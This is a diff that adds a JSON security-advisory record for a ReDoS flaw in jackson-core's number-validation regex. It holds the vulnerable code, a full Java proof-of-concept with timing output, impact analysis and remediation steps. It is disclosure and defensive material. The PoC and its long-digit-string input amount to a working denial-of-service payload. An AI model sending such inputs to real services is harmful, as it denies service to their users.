@@ -1,0 +1,74 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-10-01T15:19:23Z",
+  "Package": {
+    "Ecosystem": "MAVEN",
+    "Name": "tools.jackson.core:jackson-core"
+  },
+  "Advisory": {
+    "DatabaseId": 505178,
+    "Id": "GSA_kwCzR0hTQS1wNnBwLW0zZjgtNWM4Oc4AB7Va",
+    "GhsaId": "GHSA-p6pp-m3f8-5c89",
+    "References": [
+      {
+        "Url": "https://github.com/FasterXML/jackson-core/security/advisories/GHSA-p6pp-m3f8-5c89"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-89407"
+      },
+      {
+        "Url": "https://github.com/FasterXML/jackson-core/issues/1649"
+      },
+      {
+        "Url": "https://github.com/FasterXML/jackson-core/pull/1650"
+      },
+      {
+        "Url": "https://github.com/FasterXML/jackson-core/pull/1701"
+      },
+      {
+        "Url": "https://github.com/FasterXML/jackson-core/commit/731e794f62623aa0d86ced52490166be903fbb1d"
+      },
+      {
+        "Url": "https://github.com/FasterXML/jackson-core/commit/e7acd64cc99bd346704423dc2bfea1ab0a08ddff"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-p6pp-m3f8-5c89"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-p6pp-m3f8-5c89"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-89407"
+      }
+    ],
+    "Description": "## Status\n\n**FULLY REPRODUCED** with a clean, textbook empirical signature: measured runtime grew almost\nexactly 4x for every doubling of input size across five consecutive doublings (5,000 → 160,000\ncharacters), confirming O(n²) behavior. A single 160,000-character string (smaller than a typical\nHTTP request body) took **74.4 seconds** for one call to `NumberInput.looksLikeValidNumber()`.\n\n## Affected Component / Version\n\n- **Package:** `com.fasterxml.jackson.core:jackson-core`\n- **Confirmed against:** `jackson-core-2.20.2`\n- **Affected file:** `src/main/java/com/fasterxml/jackson/core/io/NumberInput.java`\n  (`PATTERN_FLOAT` line ~41-42, `PATTERN_FLOAT_TRAILING_DOT` line ~51, entry point\n  `looksLikeValidNumber()` lines ~646-656)\n\n## Technical Analysis\n\n```java\nprivate final static Pattern PATTERN_FLOAT = Pattern.compile(\n      \"[+-]?[0-9]*[\\\\.]?[0-9]+([eE][+-]?[0-9]+)?\");\n\nprivate final static Pattern PATTERN_FLOAT_TRAILING_DOT = Pattern.compile(\n        \"[+-]?[0-9]+[\\\\.]\");\n\npublic static boolean looksLikeValidNumber(final String s) {\n    // ... short-circuits only for null/empty/length==1 ...\n    return PATTERN_FLOAT.matcher(s).matches()\n            || PATTERN_FLOAT_TRAILING_DOT.matcher(s).matches();\n}\n```\n\n`PATTERN_FLOAT` contains ambiguous, adjacent quantifiers over the identical character class:\n`[0-9]*` (optional digits), an optional `[.]`, then `[0-9]+` (required digits). Java's\nbacktracking `Pattern`/`Matcher` engine has no possessive quantifiers or atomic grouping here,\nso on a non-matching input the engine must explore every possible split point between the\n`[0-9]*` and `[0-9]+` groups before concluding failure — the classic quadratic-backtracking\nshape. `looksLikeValidNumber()` compounds the cost by running a **second** full-string regex\n(`PATTERN_FLOAT_TRAILING_DOT`) whenever the first fails, roughly doubling the constant factor\nwithout changing the asymptotic class.\n\nCritically, the length gate that applies to this specific path is\n`StreamReadConstraints.maxStringLength` (default **20,000,000**), not `maxNumberLength`\n(default **1,000**) — the length ceiling the library uses everywhere else for numeric content.\nThis means inputs up to four orders of magnitude larger than the library's own numeric-length\npolicy reach this quadratic regex unmodified.\n\n## Reproduction Procedure\n\nSame clone/build steps as `jackson-core_1_...md`. Then:\n\n```bash\nCP=\"build/classes:build/lib/fastdoubleparser-2.0.1.jar\"\njavac -cp \"$CP\" -d poc poc/PoC8_NumberInputReDoS.java\njava -cp \"poc:$CP\" PoC8_NumberInputReDoS\n```\n\n## Full PoC Source (`poc/PoC8_NumberInputReDoS.java`)\n\n```java\nimport com.fasterxml.jackson.core.io.NumberInput;\n\npublic class PoC8_NumberInputReDoS {\n\n    public static void main(String[] args) {\n        int[] sizes = {5_000, 10_000, 20_000, 40_000, 80_000, 160_000};\n        long[] timesMs = new long[sizes.length];\n\n        System.out.println(\"Timing NumberInput.looksLikeValidNumber(\u003cn ones\u003e + 'x') for growing n:\\n\");\n\n        for (int i = 0; i \u003c sizes.length; i++) {\n            int n = sizes[i];\n            String s = repeat('1', n) + \"x\";\n\n            if (i == 0) {\n                NumberInput.looksLikeValidNumber(repeat('1', 200) + \"x\"); // warm up\n            }\n\n            long t0 = System.nanoTime();\n            boolean result = NumberInput.looksLikeValidNumber(s);\n            long elapsedMs = (System.nanoTime() - t0) / 1_000_000;\n            timesMs[i] = elapsedMs;\n\n            System.out.printf(\"n=%-8d looksLikeValidNumber=%-6b elapsed=%6d ms%n\", n, result, elapsedMs);\n        }\n\n        System.out.println(\"\\nRatio of elapsed time when n doubles (expect ~2x for linear, ~4x for quadratic):\");\n        boolean quadraticSignatureObserved = false;\n        for (int i = 1; i \u003c sizes.length; i++) {\n            double ratio = timesMs[i - 1] == 0 ? Double.NaN : (double) timesMs[i] / (double) timesMs[i - 1];\n            System.out.printf(\"  n=%d -\u003e n=%d : %dms -\u003e %dms  (ratio=%.2fx)%n\",\n                    sizes[i - 1], sizes[i], timesMs[i - 1], timesMs[i], ratio);\n            if (ratio \u003e= 3.0) quadraticSignatureObserved = true;\n        }\n\n        System.out.println(\"\\nLargest test (n=\" + sizes[sizes.length - 1] + \") took \" + timesMs[timesMs.length - 1]\n                + \" ms for a single call from ONE HTTP-body-sized string.\");\n        System.out.println(\"\\ncom.fasterxml.jackson.core.StreamReadConstraints.DEFAULT_MAX_STRING_LENGTH (20,000,000) \"\n                + \"governs this path, not maxNumberLength (1,000).\");\n\n        if (quadraticSignatureObserved) {\n            System.out.println(\"\\n=\u003e REPRODUCED: superlinear (\u003e=3x per doubling) time growth observed, consistent \"\n                    + \"with quadratic backtracking in PATTERN_FLOAT on non-matching input.\");\n        }\n    }\n\n    static String repeat(char c, int n) {\n        char[] arr = new char[n];\n        java.util.Arrays.fill(arr, c);\n        return new String(arr);\n    }\n}\n```\n\n## Captured Evidence (actual run output)\n\n```\nTiming NumberInput.looksLikeValidNumber(\u003cn ones\u003e + 'x') for growing n:\n\nn=5000     looksLikeValidNumber=false  elapsed=    74 ms\nn=10000    looksLikeValidNumber=false  elapsed=   306 ms\nn=20000    looksLikeValidNumber=false  elapsed=  1157 ms\nn=40000    looksLikeValidNumber=false  elapsed=  4655 ms\nn=80000    looksLikeValidNumber=false  elapsed= 18592 ms\nn=160000   looksLikeValidNumber=false  elapsed= 74393 ms\n\nRatio of elapsed time when n doubles (expect ~2x for linear, ~4x for quadratic):\n  n=5000 -\u003e n=10000 : 74ms -\u003e 306ms  (ratio=4.14x)\n  n=10000 -\u003e n=20000 : 306ms -\u003e 1157ms  (ratio=3.78x)\n  n=20000 -\u003e n=40000 : 1157ms -\u003e 4655ms  (ratio=4.02x)\n  n=40000 -\u003e n=80000 : 4655ms -\u003e 18592ms  (ratio=3.99x)\n  n=80000 -\u003e n=160000 : 18592ms -\u003e 74393ms  (ratio=4.00x)\n\nLargest test (n=160000) took 74393 ms for a single call from ONE HTTP-body-sized string.\n\n=\u003e REPRODUCED: superlinear (\u003e=3x per doubling) time growth observed, consistent with quadratic\nbacktracking in PATTERN_FLOAT on non-matching input.\n```\n\nThis is an unusually clean empirical result: five consecutive doublings each produced a ratio\nbetween 3.78x and 4.14x — matching the theoretical O(n²) prediction (ratio = 4.0x) to within\n5% at every single measurement, leaving essentially no ambiguity about the complexity class.\nExtrapolating this measured curve, a ~1MB string (well within common request body limits) would\ntake on the order of hours for a single call.\n\n## Impact\n\nAny application that coerces a String-typed JSON field to a number (default `jackson-databind`\nbehavior) is exposed: an attacker who can submit a large numeric-looking string (up to\n`maxStringLength`'s default of 20,000,000 characters — far larger than needed given the\nmeasured curve) can pin a request-handling thread for an extended period with a single request.\nBecause the cost scales quadratically, a handful of concurrent moderately-sized requests\n(tens to low hundreds of KB each) is sufficient to exhaust a typical web server's worker thread\npool, denying service to all users.\n\n## Remediation\n\n1. Rewrite `PATTERN_FLOAT` without quantifier ambiguity using possessive quantifiers, e.g.\n   `[+-]?(?:[0-9]++(?:\\.[0-9]*+)?|\\.[0-9]++)(?:[eE][+-]?[0-9]++)?`, which also folds in the\n   trailing-dot case and removes the need for a second full-string scan.\n2. Better: replace the regex entirely with a single-pass hand-written character scan — the same\n   file already contains exactly this pattern for `parseInt`, so the library has both the\n   precedent and the code style available.\n3. Apply an independent length limit (`maxNumberLength`, not the much larger\n   `maxStringLength`) before calling `looksLikeValidNumber()`, closing the four-orders-of-\n   magnitude gap between the two constraints for this specific code path.\n4. Operationally, until fixed: tighten `StreamReadConstraints.maxStringLength` well below its\n   default, and set wall-clock timeouts on parse/coercion operations.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-10-01T15:19:21Z",
+    "Severity": "HIGH",
+    "Summary": " jackson-core: ReDoS: quadratic backtracking in NumberInput.PATTERN_FLOAT via looksLikeValidNumber()",
+    "UpdatedAt": "2026-10-01T15:19:23Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 7.5,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "3.2.2"
+      },
+      "VulnerableVersionRange": "\u003e= 3.2.0, \u003c= 3.2.1"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "3.1.7"
+      },
+      "VulnerableVersionRange": "\u003e= 3.0.0, \u003c= 3.1.6"
+    }
+  ]
+}
